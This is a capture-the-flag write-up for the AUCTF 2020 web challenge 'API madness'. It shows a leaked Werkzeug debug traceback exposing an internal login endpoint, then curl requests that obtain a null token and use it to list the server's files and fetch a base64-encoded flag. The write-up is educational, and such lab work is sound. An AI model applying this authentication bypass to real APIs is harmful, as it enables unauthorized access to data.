AUCTF 2020 â€“ API madness

Category: web
Points: 926

Challenge

http://challenges.auctf.com:30023
We are building out our new API. We even have authentication built in!
Author: shinigami

Solution
Connecting to http://challenges.auctf.com:30023 you will get the following message.

{
  "NOTE": "For API help visit our help page /static/help", 
  "status": "OK"
}

The help page at http://challenges.auctf.com:30023/static/help will give you the following information.
```html


FTP Server API Help Page


Endpoints
/api/login - POST
/api/ftp/dir - POST
/api/ftp/get_file - POST


Params
/api/login - username, password
/ftp/dir - dir
/ftp/get_file - file


```
So the following API endpoints are available:
* /api/login - HTTP POST with username, password JSON parameters;
* /api/ftp/dir - HTTP POST with dir JSON parameter;
* /api/ftp/get_file - HTTP POST with file JSON parameter.
Using the /api/login endpoint an error page will appear.
```html



ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/logincheck (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0>: Failed to establish a new connection: [Errno 110] Connection timed out',)) // Werkzeug Debugger









requests.exceptions.ConnectionError

ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0>: Failed to establish a new connection: [Errno 110] Connection timed out',))

Traceback (most recent call last)


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 2463,
      in __call__
 
    def __call__(self, environ, start_response):
        """The WSGI server calls the Flask application object as the
        WSGI application. This calls :meth:`wsgi_app` which can be
        wrapped to applying middleware."""
        return self.wsgi_app(environ, start_response)
 
    def __repr__(self):
        return "<%s %r>" % (self.__class__.__name__, self.name)


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 2449,
      in wsgi_app
            try:
                ctx.push()
                response = self.full_dispatch_request()
            except Exception as e:
                error = e
                response = self.handle_exception(e)
            except:  # noqa: B001
                error = sys.exc_info()[1]
                raise
            return response(environ, start_response)
        finally:


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 1866,
      in handle_exception
            # if we want to repropagate the exception, we can attempt to
            # raise it with the whole traceback in case we can do that
            # (the function was actually called from the except part)
            # otherwise, we just raise the error again
            if exc_value is e:
                reraise(exc_type, exc_value, tb)
            else:
                raise e
 
        self.log_exception((exc_type, exc_value, tb))
        server_error = InternalServerError()


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 2446,
      in wsgi_app
        ctx = self.request_context(environ)
        error = None
        try:
            try:
                ctx.push()
                response = self.full_dispatch_request()
            except Exception as e:
                error = e
                response = self.handle_exception(e)
            except:  # noqa: B001
                error = sys.exc_info()[1]


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 1951,
      in full_dispatch_request
            request_started.send(self)
            rv = self.preprocess_request()
            if rv is None:
                rv = self.dispatch_request()
        except Exception as e:
            rv = self.handle_user_exception(e)
        return self.finalize_request(rv)
 
    def finalize_request(self, rv, from_error_handler=False):
        """Given the return value from a view function this finalizes
        the request by converting it into a response and invoking the


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 1820,
      in handle_user_exception
            return self.handle_http_exception(e)
 
        handler = self._find_error_handler(e)
 
        if handler is None:
            reraise(exc_type, exc_value, tb)
        return handler(e)
 
    def handle_exception(self, e):
        """Handle an exception that did not have an error handler
        associated with it, or that was raised from an error handler.


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 1949,
      in full_dispatch_request
        self.try_trigger_before_first_request_functions()
        try:
            request_started.send(self)
            rv = self.preprocess_request()
            if rv is None:
                rv = self.dispatch_request()
        except Exception as e:
            rv = self.handle_user_exception(e)
        return self.finalize_request(rv)
 
    def finalize_request(self, rv, from_error_handler=False):


File "/usr/local/lib/python2.7/site-packages/flask/app.py",
      line 1935,
      in dispatch_request
            getattr(rule, "provide_automatic_options", False)
            and req.method == "OPTIONS"
        ):
            return self.make_default_options_response()
        # otherwise dispatch to the handler for that endpoint
        return self.view_functions[rule.endpoint](**req.view_args)
 
    def full_dispatch_request(self):
        """Dispatches the request and on top of that performs request
        pre and postprocessing as well as HTTP exception catching and
        error handling.


File "/web_server.py",
      line 21,
      in try_login
    if not request.json or 'username' not in request.json:
        abort(400)
    username = request.json['username']
    password = request.json.get("password","")
    login_check = {"username":username,"password":password}
    token = r.post("http://10.0.2.8/api/login_check",json=login_check).json()['token']
    r_data = {"status":"OK", "token":token}
    return jsonify(r_data)
 
@app.route('/static/help')
def help_page():


File "/usr/local/lib/python2.7/site-packages/requests/api.py",
      line 112,
      in post
    :param \*\*kwargs: Optional arguments that ``request`` takes.
    :return: :class:`Response <Response>` object
    :rtype: requests.Response
    """
 
    return request('post', url, data=data, json=json, **kwargs)
 
 
def put(url, data=None, **kwargs):
    r"""Sends a PUT request.
 


File "/usr/local/lib/python2.7/site-packages/requests/api.py",
      line 58,
      in request
 
    # By using the 'with' statement we are sure the session is closed, thus we
    # avoid leaving sockets open which can trigger a ResourceWarning in some
    # cases, and look like a memory leak in others.
    with sessions.Session() as session:
        return session.request(method=method, url=url, **kwargs)
 
 
def get(url, params=None, **kwargs):
    r"""Sends a GET request.
 


File "/usr/local/lib/python2.7/site-packages/requests/sessions.py",
      line 508,
      in request
        send_kwargs = {
            'timeout': timeout,
            'allow_redirects': allow_redirects,
        }
        send_kwargs.update(settings)
        resp = self.send(prep, **send_kwargs)
 
        return resp
 
    def get(self, url, **kwargs):
        r"""Sends a GET request. Returns :class:`Response` object.


File "/usr/local/lib/python2.7/site-packages/requests/sessions.py",
      line 618,
      in send
 
        # Start time (approximately) of the request
        start = preferred_clock()
 
        # Send the request
        r = adapter.send(request, **kwargs)
 
        # Total elapsed time of the request (approximately)
        elapsed = preferred_clock() - start
        r.elapsed = timedelta(seconds=elapsed)
 


File "/usr/local/lib/python2.7/site-packages/requests/adapters.py",
      line 508,
      in send
 
            if isinstance(e.reason, _SSLError):
                # This branch is for urllib3 v1.22 and later.
                raise SSLError(e, request=request)
 
            raise ConnectionError(e, request=request)
 
        except ClosedPoolError as e:
            raise ConnectionError(e, request=request)
 
        except _ProxyError as e:


ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0>: Failed to establish a new connection: [Errno 110] Connection timed out',))





      This is the Copy/Paste friendly version of the traceback.  You can also paste this traceback into
      a gist:
      

Traceback (most recent call last):
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 2463, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 2449, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1866, in handle_exception
    reraise(exc_type, exc_value, tb)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 2446, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1951, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1820, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1949, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1935, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "/web_server.py", line 21, in try_login
    token = r.post("http://10.0.2.8/api/login_check",json=login_check).json()['token']
  File "/usr/local/lib/python2.7/site-packages/requests/api.py", line 112, in post
    return request('post', url, data=data, json=json, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/api.py", line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/sessions.py", line 508, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/sessions.py", line 618, in send
    r = adapter.send(request, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/adapters.py", line 508, in send
    raise ConnectionError(e, request=request)
ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0>: Failed to establish a new connection: [Errno 110] Connection timed out',))



  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.

  <div class="footer">
    Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
    friendly Werkzeug powered traceback interpreter.
  </div>
</div>

<div class="pin-prompt">
  <div class="inner">
    <h3>Console Locked</h3>
    <p>
      The console is locked and needs to be unlocked by entering the PIN.
      You can find the PIN printed out on the standard output of your
      shell that runs the server.
    <form>
      <p>PIN:
        <input type=text name=pin size=14>
        <input type=submit name=btn value="Confirm Pin">
    </form>
  </div>
</div>




```
The error will leak http://challenges.auctf.com:30023/api/login_check endpoint. Trying to use it, you will get a "null token".

$ curl -X POST -H "Content-Type: application/json" -d '{"username":"m3ssap0","password":"password"}' http://challenges.auctf.com:30023/api/login_check
{
  "token": null
}

This "token" can be used to authenticate on other endpoints to discover and retrieve the flag file (i.e. Broken Authentication vulnerability in OWASP Top 10).
```
$ curl -X POST -H "Content-Type: application/json" -d '{"dir":".", "token":null}' http://challenges.auctf.com:30023/api/ftp/dir
{
  "dir": [
    ".dockerenv",
    "bin",
    "boot",
    "dev",
    "etc",
    "flag.txt",
    "ftpserver.py",
    "home",
    "lib",
    "lib64",
    "media",
    "mnt",
    "opt",
    "proc",
    "root",
    "run",
    "sbin",
    "srv",
    "startup.sh",
    "sys",
    "templates",
    "tmp",
    "usr",
    "var",
    "webserver.py"
  ],
  "status": "OK"
}
$ curl -X POST -H "Content-Type: application/json" -d '{"file":"flag.txt", "token":null}' http://challenges.auctf.com:30023/api/ftp/getfile
{
  "filedata": "YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==\n",
  "status": "OK"
}
```
The data is base64 encoded (YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==); decoding it you will find the flag.

auctf{0w@sp_6roK3N_@uth}

